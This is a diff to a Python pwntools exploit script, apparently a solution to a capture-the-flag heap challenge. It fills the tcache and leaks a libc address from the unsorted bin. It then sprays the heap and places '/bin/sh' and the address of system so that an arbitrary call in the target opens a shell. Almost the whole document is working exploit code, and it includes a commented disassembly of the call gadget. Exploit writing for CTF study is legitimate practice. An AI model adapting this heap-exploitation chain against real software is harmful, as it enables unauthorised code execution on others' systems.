@@ -8,6 +8,7 @@ libc = elf.libc
 context.log_level = "critical"
 
 gs = """
+b _
 continue
 """
 
@@ -23,20 +24,20 @@ io = start()
 class ProgramInteraction:
     @staticmethod
     def add(size, indx, data):
-        io.sendlineafter(b" ", b"1")
-        io.sendlineafter(b" ", str(size).encode())
-        io.sendlineafter(b" ", str(indx).encode())
-        io.sendlineafter(b" ", data)
+        io.sendlineafter("💀 ", b"1")
+        io.sendlineafter("💀 ", str(size).encode())
+        io.sendlineafter("💀 ", str(indx).encode())
+        io.sendlineafter("💀 ", data)
 
     @staticmethod
     def free(indx):
-        io.sendlineafter(b" ", b"2")
-        io.sendlineafter(b" ", str(indx).encode())
+        io.sendlineafter("💀 ", b"2")
+        io.sendlineafter("💀 ", str(indx).encode())
 
     @staticmethod
     def show(indx) -> int:
-        io.sendlineafter(b" ", b"3")
-        io.sendlineafter(b" ", str(indx).encode())
+        io.sendlineafter("💀 ", b"3")
+        io.sendlineafter("💀 ", str(indx).encode())
         io.recvuntil(b"Page content: ")
         leak = io.recvline().strip()
         leak = u64(leak.ljust(8, b"\x00"))
@@ -47,17 +48,17 @@ class ProgramInteraction:
 
 if __name__ == "__main__":
     program = ProgramInteraction()
-    for i in range(9):                    # allocate 9 chunks 
-        program.add(0x80, i, b"A"*0x80)   # this will be to fill up tcache and get a chunk for consolidation and a victim chunk
+    for i in range(8):                    # allocate 9 chunks 
+        program.add(0x80, i, b"A"*0x80)   # this will be to fill up tcache, the next freed chunk of this size will be unsortedbin due to tunable being adjusted
 
-    program.add(0x10, 9, b"B"*0x10)       # anti top chunk consolidation
+    program.add(0x10, 8, b"B"*0x10)       # anti top chunk consolidation
 
     # cause chunk overlapping
     for i in range(7):                    # free all 7 chunks
         program.free(i)                   # free the tcache, next chunk freed with same size will be fastbin
 
     program.free(7)                       # free victim chunk
-    program.free(8)                       # free consolidation chunk and boom unsortedbin
+
 
     unsortedbin = program.show(7)
     libc.address = unsortedbin - 0x21ace0               # unsortedbin leak - offset from libc
@@ -65,9 +66,9 @@ if __name__ == "__main__":
 
 
     for i in range(5):                           # heap spray
-        program.add(0x80, 0, chr(0x41+i) * 8)    # so that we can get /bin/sh into RDI for system
+        program.add(0x80, 0, chr(0x41+i) * 8)    # so now we can control RDI and RDX
 
-"""
+    """
 00001939  488b45d8           mov     rax, qword [rbp-0x28 {argument_one}]    # the chunk at which our /bin/sh string lives
 0000193d  4883c008           add     rax, 0x8                                # adds 0x8 to RAX so its pointing to the user data
 00001941  488b00             mov     rax, qword [rax]                        # derefrences whats at RAX and moves it back into RAX
@@ -76,7 +77,7 @@ if __name__ == "__main__":
 00001948  4889c7             mov     rdi, rax  # mov RAX into RDI so that we can control arg1 of whatever function we call
 0000194b  ffd2               call    rdx       # this is our arbitrary call where we get to call whatever address is inside of RDX
 0000194d  90                 nop     
-"""
+    """
     program.add(0x80, 0, b"/bin/sh")                # /bin/sh into RDI
     program.add(0x80, 0, hex(libc.sym.system)[2:])  # send system as a hex string for the arbitrary call
     io.sendlineafter(b" ",b"42")                    # get shell
